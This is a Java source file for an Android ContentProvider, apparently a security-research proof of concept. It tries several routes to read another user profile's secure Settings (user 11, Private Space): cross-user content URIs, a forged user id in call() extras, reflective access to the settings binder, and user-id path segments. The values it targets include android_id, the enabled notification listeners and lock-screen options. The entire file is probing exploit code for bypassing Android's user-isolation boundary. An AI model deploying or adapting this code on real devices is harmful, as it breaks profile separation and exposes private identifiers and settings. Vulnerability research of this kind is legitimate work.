package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import android.provider.Settings;
import java.lang.reflect.Method;

public class SettingsCrossUserV2Provider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        ContentResolver cr = getContext().getContentResolver();

        // Try reading settings for user 11 (Private Space) via content URI manipulation
        cursor.addRow(new Object[]{"=== Cross-User Settings Read (user 11) ===", ""});

        // Method 1: Direct URI with userId in path
        // content://settings/secure/lock_screen_allow_private_notifications?user=11
        String[] keys = {
            "lock_screen_allow_private_notifications",
            "lockscreen.options",
            "android_id",
            "enabled_notification_listeners",
            "location_mode",
            "default_input_method"
        };

        for (String key : keys) {
            // Attempt 1: content://N@settings/secure where N is userId
            try {
                Uri crossUri = Uri.parse("content://11@settings/secure/" + key);
                Cursor c = cr.query(crossUri, new String[]{"value"}, null, null, null);
                if (c != null) {
                    String val = c.moveToFirst() ? c.getString(0) : "(empty)";
                    c.close();
                    cursor.addRow(new Object[]{"xuser_uri_u11:" + key, val});
                } else {
                    cursor.addRow(new Object[]{"xuser_uri_u11:" + key, "(null cursor)"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"xuser_uri_u11:" + key, "ERR:" + trunc(e.getMessage())});
            }

            // Attempt 2: Call method with userId in extras
            try {
                android.os.Bundle extras = new android.os.Bundle();
                extras.putInt("_user", 11);
                android.os.Bundle result = cr.call(
                    Uri.parse("content://settings/secure"),
                    "GET_secure",
                    key,
                    extras);
                if (result != null) {
                    String val = result.getString("value", "(no value key)");
                    cursor.addRow(new Object[]{"xuser_call_u11:" + key, val});
                } else {
                    cursor.addRow(new Object[]{"xuser_call_u11:" + key, "(null bundle)"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"xuser_call_u11:" + key, "ERR:" + trunc(e.getMessage())});
            }
        }

        // Method 3: Try using raw Binder to SettingsProvider with forged userId
        cursor.addRow(new Object[]{"=== Binder direct to SettingsProvider ===", ""});
        try {
            IBinder settingsBinder = svc("settings");
            if (settingsBinder != null) {
                cursor.addRow(new Object[]{"settings_binder", "obtained"});
            } else {
                cursor.addRow(new Object[]{"settings_binder", "null - not a named service"});
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"settings_binder", "ERR:" + trunc(e.getMessage())});
        }

        // Method 4: ContentProvider query to settings/secure with user in selection
        cursor.addRow(new Object[]{"=== Settings query with user selection ===", ""});
        for (String key : new String[]{"android_id", "enabled_notification_listeners"}) {
            try {
                Uri secureUri = Uri.parse("content://settings/secure");
                Cursor c = cr.query(secureUri, null, "name=?", new String[]{key}, null);
                if (c != null && c.moveToFirst()) {
                    int idx = c.getColumnIndex("value");
                    String val = idx >= 0 ? c.getString(idx) : "(no value col)";
                    c.close();
                    cursor.addRow(new Object[]{"query_u0:" + key, val});
                } else {
                    cursor.addRow(new Object[]{"query_u0:" + key, "(no rows)"});
                    if (c != null) c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"query_u0:" + key, "ERR:" + trunc(e.getMessage())});
            }
        }

        // Method 5: Try the ContentProvider URI with userId segment
        // content://settings/secure/N/key - some versions support this
        cursor.addRow(new Object[]{"=== URI path with userId ===", ""});
        for (String key : new String[]{"android_id", "lock_screen_allow_private_notifications"}) {
            for (int userId : new int[]{0, 11}) {
                try {
                    // Try format: content://settings/user/11/secure/key
                    Uri userUri = Uri.parse("content://settings/user/" + userId + "/secure/" + key);
                    Cursor c = cr.query(userUri, null, null, null, null);
                    if (c != null && c.moveToFirst()) {
                        int idx = c.getColumnIndex("value");
                        String val = idx >= 0 ? c.getString(idx) : "rows=" + c.getCount();
                        c.close();
                        cursor.addRow(new Object[]{"userpath_u" + userId + ":" + key, val});
                    } else {
                        cursor.addRow(new Object[]{"userpath_u" + userId + ":" + key, "(null/empty)"});
                        if (c != null) c.close();
                    }
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"userpath_u" + userId + ":" + key, "ERR:" + trunc(e.getMessage())});
                }
            }
        }

        return cursor;
    }

    private IBinder svc(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) { return null; }
    }

    private String trunc(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
